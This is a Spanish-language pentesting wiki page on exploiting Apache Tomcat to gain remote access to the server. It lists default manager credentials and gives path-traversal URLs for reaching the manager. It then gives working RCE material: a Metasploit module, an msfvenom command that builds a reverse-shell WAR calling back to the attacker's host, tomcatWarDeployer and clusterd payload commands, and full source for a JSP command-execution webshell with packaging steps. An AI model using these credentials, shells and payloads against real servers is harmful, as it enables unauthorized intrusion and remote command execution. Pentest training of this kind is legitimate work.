---
description: Explotar apache tomcat para obtener acceso remoto al servidor.
---

# APACHE TOMCAT

## INFORMACIÓN BÁSICA

{% embed url="https://www.hostdime.com.ar/blog/que-es-apache-tomcat" %}
Fuente
{% endembed %}

Estrictamente hablando, Tomcat no es un servidor web como Apache HTTPS Server o NGINX.

Comenzado en 1999 y desarrollado como un proyecto de código abierto por la Apache Software Foundation (ASF), Apache Tomcat es un contenedor Java Servlet, o contenedor web, que proporciona la funcionalidad extendida para interactuar con Java Servlets, al tiempo que implementa varias especificaciones técnicas de la plataforma Java: JavaServer Pages (JSP), Java Expression Language (Java EL) y WebSocket.

### Que es un JAVA servlet

Este es un software que permite que un servidor web maneje contenido web dinámico basado en Java utilizando el protocolo HTTP. JSP es una tecnología similar que permite a los desarrolladores crear contenido dinámico utilizando documentos HTML o XML. En términos de su capacidad para habilitar contenido dinámico, los Servlets de Java y JSP son ampliamente comparables a PHP o ASP.NET, solo basados ​​en el lenguaje de programación Java.

Al reunir todas estas tecnologías basadas en Java, Tomcat ofrece un entorno de servidor web «Java puro» para ejecutar aplicaciones creadas en el lenguaje de programación Java.

{% hint style="info" %}
Si bien Apache es un servidor web HTTPS tradicional, optimizado para manejar contenido web estático y dinámico (muy a menudo basado en PHP), carece de la capacidad de administrar Servlets Java y JSP. Tomcat, por otro lado, está casi totalmente orientado al contenido basado en Java. De hecho, Tomcat se desarrolló originalmente como un medio para proporcionar la funcionalidad JSP que Apache carecía.
{% endhint %}

## VULNERABILIDADES

{% embed url="https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager" %}
Fuente
{% endembed %}

{% embed url="https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat" %}
Fuente
{% endembed %}

En muchas ocasiones nos topamos con servidores que contienen una instancia de Apache Tomcat con credenciales conocidos o con los **credenciales por defecto.**  Esto nos permite obtener fácilmente acceso remoto al servidor de las maneras que vamos a ver a continuación.

### Listado de Credenciales por Defecto.

| Username |   Password   |
| :------: | :----------: |
|   admin  |   password   |
|   admin  | \[en blanco] |
|   admin  |   Password1  |
|   admin  |   password1  |
|   admin  |     admin    |
|   admin  |    tomcat    |
|   both   |    tomcat    |
|  manager |    manager   |
|   role1  |     role1    |
|   role1  |    tomcat    |
|   role   |  changethis  |
|   root   |   Password1  |
|   root   |  changethis  |
|   root   |   password   |
|   root   |   password1  |
|   root   |     r00t     |
|   root   |     root     |
|   root   |     toor     |
|  tomcat  |    tomcat    |
|  tomcat  |    s3cret    |
|  tomcat  |   password1  |
|  tomcat  |   password   |
|  tomcat  | \[en blanco] |
|  tomcat  |     admin    |
|  tomcat  |  changethis  |

### Double URL encode

La primera vulnerabilidad que vamos a ver es **mod\_jk en** [**CVE-2007-1860**](https://www.incibe-cert.es/alerta-temprana/vulnerabilidades/cve-2007-1860)**.** Esta vulnerabilidad permite realizar **path traversal** mediante doble encoding de la URL.

Es decir, para acceder al Tomcat app manager vamos a:

`[rutaTomcat]/%252E%252E/manager/html`

Puede ser que para enviar una webshell tengamos que utilizar este truco y mandar una coockie o una token SSRF.

Para acceder a una backdoor puede ser que lo necesitemos tambien.

### /examples

{% embed url="https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks" %}
Fuente
{% endembed %}

Algunos de los ejemplos de este directorio (incluido en Apache Tomcat v4.x - v7.x) pueden ser utilizados por el atacante para obtener información del objetivo.

Algunos de ellos son vulnerables a XSS:

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### Path Traversal (..;/) o (;param = value)

En algunas versiones vulnerables de Tomcat podemos acceder a directorios protegidos utilizando la ruta `/..;/` o `/;param = value`

Por ejemplo:

`www.vulnerable.com/lalala/..;/manager/html`

`www.vulnerable.com/;param=value/manager/html`

## RCE

Por último, si tienes acceso al Tomcat app Manager puedes subir y desplegar un archivo .war (ejecutable).

### Limitaciones

Solo podrás desplegar un archivo WAR si tienes **suficientes privilegios** (roles: **admin**, **manager**, **manager-script**).

Estos detalles se pueden ver normalmente en:

`/usr/share/tomcat9/etc/tomcat-users.xml`

### Metasploit

```
use exploit/multi/http/tomcat_mgr_upload
```

### MSFVenom Reverse Shell

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Tu IP] LPORT=[Puerto] -f war -o revshell.war
```

![Fuente: Hacking Articles](<../../.gitbook/assets/APACHE TOMCAT.png>)

Después debes subir este archivo y acceder a `www.vulnerable.com/revshell`

### tomcatWarDeployer.py

{% embed url="https://github.com/mgeeky/tomcatWarDeployer" %}
Fuente
{% endembed %}

```
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```

### Culsterd

{% embed url="https://github.com/hatRiot/clusterd" %}
Fuente
{% endembed %}

```
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```

### Método manual (WebShell)

Creamos un archivo index.jsp con el siguiente contenido:

```
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

Luego lo convertimos a WAR con los siguientes comandos:

```
$ mkdir webshell
$ cp index.jsp webshell
$ cd webshell
$ jar -cvf ../webshell.war *
webshell.war is created
```

DespuésDespués debes subir este archivo y acceder a `www.vulnerable.com/webshell`
